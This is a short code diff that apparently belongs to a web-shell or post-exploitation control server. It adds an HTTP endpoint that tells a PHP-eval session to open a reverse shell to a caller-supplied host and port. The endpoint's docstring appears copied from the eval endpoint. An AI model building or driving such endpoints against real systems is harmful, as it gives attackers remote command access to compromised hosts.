@@ -481,6 +481,19 @@ async def session_php_eval(session_id: UUID, req: PhpCodeRequest):
     return {"code": 0, "data": result}
 
 
+@app.post("/session/{session_id}/open_reverse_shell")
+@catch_user_error
+async def session_open_reverse_shell(
+    session_id: UUID,
+    host: str = Body(),
+    port: int = Body(),
+):
+    """eval对应代码"""
+    session: SessionInterface = session_manager.get_session_by_id(session_id)
+    result = await session.open_reverse_shell(host, port)
+    return {"code": 0, "data": True}
+
+
 @app.get("/session/{session_id}/deploy_vessel")
 @catch_user_error
 async def session_deploy_vessel(session_id: UUID):
